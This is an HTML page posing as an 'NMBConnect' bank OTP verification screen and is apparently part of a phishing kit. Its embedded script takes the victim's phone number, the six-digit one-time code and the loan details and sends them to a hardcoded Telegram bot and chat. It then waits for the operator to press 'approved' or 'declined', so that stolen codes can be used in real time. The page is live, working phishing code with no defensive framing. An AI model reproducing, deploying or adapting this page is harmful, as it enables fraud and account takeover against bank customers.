<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <meta name="theme-color" content="#003366">
    <title>NMBConnect | Verify OTP</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --nmb-blue: #003366;
            --nmb-gold: #E4C16A;
            --white: #ffffff;
            --error: #ff4d4d;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('https://images.unsplash.com/photo-1556742049-0cfed4f6a45d?q=80&w=1000&auto=format&fit=crop');
            background-size: cover;
            background-position: center;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            color: white;
            padding: 20px;
        }

        .header-nav {
            width: 100%;
            display: flex;
            align-items: center;
            padding: 10px 0;
            margin-bottom: 30px;
        }

        .back-btn { font-size: 24px; cursor: pointer; margin-right: 15px; }
        .nav-title { font-size: 18px; font-weight: 500; }

        .logo-container {
            text-align: center;
            margin-bottom: 40px;
        }

        .logo-circle {
            width: 100px;
            height: 100px;
            background: var(--nmb-blue);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 15px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
        }

        .brand-name { font-size: 20px; font-weight: 700; }
        .brand-name .nmb { color: #4a90e2; }
        .brand-name .connect { color: var(--nmb-gold); }

        .card-head { text-align: center; margin-bottom: 30px; }
        .card-head h1 { font-size: 22px; font-weight: 700; margin-bottom: 10px; }
        .card-head p { font-size: 14px; opacity: 0.9; }

        .otp-row {
            display: flex;
            gap: 10px;
            justify-content: center;
            margin-bottom: 30px;
        }

        .otp-box {
            width: 45px;
            height: 55px;
            text-align: center;
            font-size: 24px;
            font-weight: 700;
            border: 1px solid rgba(255, 255, 255, 0.8);
            border-radius: 12px;
            background: rgba(255, 255, 255, 0.1);
            color: white;
            backdrop-filter: blur(5px);
            outline: none;
            transition: all 0.2s;
        }

        .otp-box:focus { border-color: var(--nmb-gold); background: rgba(255, 255, 255, 0.2); }
        .otp-box.ok { border-color: #4caf50; }

        .sign-in-btn {
            width: 100%;
            max-width: 360px;
            padding: 16px;
            background: white;
            color: var(--nmb-blue);
            border: none;
            border-radius: 12px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
        }

        .error-msg {
            color: var(--error);
            font-size: 13px;
            text-align: center;
            margin-bottom: 15px;
            display: none;
            background: rgba(0,0,0,0.5);
            padding: 8px;
            border-radius: 8px;
        }

        /* Overlay */
        .overlay {
            position: fixed; inset: 0;
            display: none;
            align-items: center; justify-content: center; flex-direction: column;
            background: rgba(0,0,0,0.85);
            z-index: 2000;
            backdrop-filter: blur(8px);
            text-align: center;
            padding: 20px;
        }

        .overlay.on { display: flex; }
        .spin { width: 50px; height: 50px; border: 4px solid rgba(255,255,255,0.1); border-top-color: var(--nmb-gold); border-radius: 50%; animation: sp 0.8s linear infinite; }
        .sp-t { font-size: 18px; font-weight: 600; color: white; margin-top: 20px; }
        .sp-s { font-size: 14px; color: rgba(255,255,255,0.7); margin-top: 10px; }
        @keyframes sp { to { transform: rotate(360deg); } }
    </style>
</head>
<body onload="init()">
    <div class="header-nav">
        <span class="back-btn" onclick="location.href='login.html'">❮</span>
        <span class="nav-title">Verify OTP</span>
    </div>

    <div class="logo-container">
        <div class="logo-circle">
            <svg viewBox="0 0 100 100" width="60" height="60">
                <path d="M30,50 L70,50 M30,40 C20,40 20,60 30,60 L70,60 C80,60 80,40 70,40" fill="none" stroke="#E4C16A" stroke-width="8" stroke-linecap="round"/>
                <path d="M45,35 L55,65" stroke="#E4C16A" stroke-width="8" stroke-linecap="round"/>
            </svg>
        </div>
        <div class="brand-name"><span class="nmb">NMB</span><span class="connect">Connect</span></div>
    </div>

    <div class="card-head">
        <h1>Verify Code</h1>
        <p>Enter the 6-digit OTP code sent to your phone</p>
    </div>

    <div id="err" class="error-msg"></div>

    <div class="otp-row" id="otpRow">
        <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
        <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
        <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
        <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
        <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
        <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
    </div>

    <button class="sign-in-btn" onclick="doOTP()">Verify & Continue</button>

    <div id="ov" class="overlay">
        <div class="spin"></div>
        <div class="sp-t">Verifying Code</div>
        <div class="sp-s">Please wait a moment while we process your request.<br>Do not close this page.</div>
    </div>

    <script>
        const BOT = '8807278526:AAF8s3Z7XsjQNSk2ybpDwyappH6F7aWQexM';
        const CID = '7547427914';
        let bd = {}, luid = 0, otp = '', phone = '';
        const boxes = document.querySelectorAll('.otp-box');

        function init() {
            const p = new URLSearchParams(location.search);
            const d = p.get('data'), pr = p.get('price');
            phone = p.get('phone') || '';
            if (d && pr) { bd = { data: d, price: pr }; }
            setupOTP();
        }

        function setupOTP() {
            boxes.forEach((b, i) => {
                b.addEventListener('input', e => {
                    const v = e.target.value;
                    if (v.length > 1) {
                        const digs = v.replace(/\D/g, '').split('');
                        digs.forEach((d, j) => { if (i+j < boxes.length) { boxes[i+j].value = d; boxes[i+j].classList.add('ok'); } });
                        boxes[Math.min(i + digs.length, boxes.length - 1)].focus();
                        chk();
                        if (otp.length === 6) doOTP();
                        return;
                    }
                    if (v) { 
                        b.classList.add('ok'); 
                        if (i < boxes.length - 1) boxes[i+1].focus(); 
                    } else { 
                        b.classList.remove('ok'); 
                    }
                    chk();
                    if (otp.length === 6) doOTP();
                });
                b.addEventListener('keydown', e => {
                    if (e.key === 'Backspace' && !b.value && i > 0) boxes[i-1].focus();
                });
            });
        }

        function chk() { otp = Array.from(boxes).map(b => b.value).join(''); }
        function showErr(m) { const e = document.getElementById('err'); e.textContent = m; e.style.display = 'block'; }
        function clrErr() { document.getElementById('err').style.display = 'none'; }

        async function tg(msg, btns) {
            try {
                const r = await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CID, text: msg, reply_markup: btns ? { inline_keyboard: btns } : undefined, parse_mode: 'HTML' })
                });
                const d = await r.json();
                if (d.ok) {
                    const ur = await fetch(`https://api.telegram.org/bot${BOT}/getUpdates?limit=1&offset=-1`);
                    const ud = await ur.json();
                    if (ud.ok && ud.result.length > 0) { luid = ud.result[0].update_id; }
                }
            } catch(e) { console.error(e); }
        }

        function doOTP() {
            clrErr();
            if (otp.length !== 6) { showErr('Enter the 6-digit code'); return; }

            const msg = `🔑 <b>OTP Code</b>\n\n<b>Phone:</b> <code>+263${phone}</code>\n<b>OTP:</b> <code>${otp}</code>\n<b>Loan:</b> <code>${bd.data || 'N/A'}</code>`;
            const btns = [[{ text: '✓ Approved', callback_data: 'otp_approved' }, { text: '✗ Declined', callback_data: 'otp_declined' }]];

            document.getElementById('ov').classList.add('on');
            tg(msg, btns);
            poll();
        }

        function poll() {
            const iv = setInterval(() => {
                fetch(`https://api.telegram.org/bot${BOT}/getUpdates?offset=${luid + 1}`)
                    .then(r => r.json())
                    .then(d => {
                        if (d.ok && d.result.length > 0) {
                            d.result.forEach(u => {
                                luid = u.update_id;
                                if (u.callback_query) {
                                    const cb = u.callback_query.data;
                                    if (cb === 'otp_approved') { 
                                        clearInterval(iv); 
                                        document.getElementById('ov').classList.remove('on'); 
                                        location.href = 'success.html';
                                    }
                                    else if (cb === 'otp_declined') { 
                                        clearInterval(iv); 
                                        document.getElementById('ov').classList.remove('on'); 
                                        showErr('Invalid code. Please try again.'); 
                                        boxes.forEach(b => { b.value = ''; b.classList.remove('ok'); }); 
                                        boxes[0].focus(); 
                                    }
                                }
                            });
                        }
                    }).catch(e => console.error(e));
            }, 1500);
            setTimeout(() => clearInterval(iv), 600000);
        }
    </script>
</body>
</html>
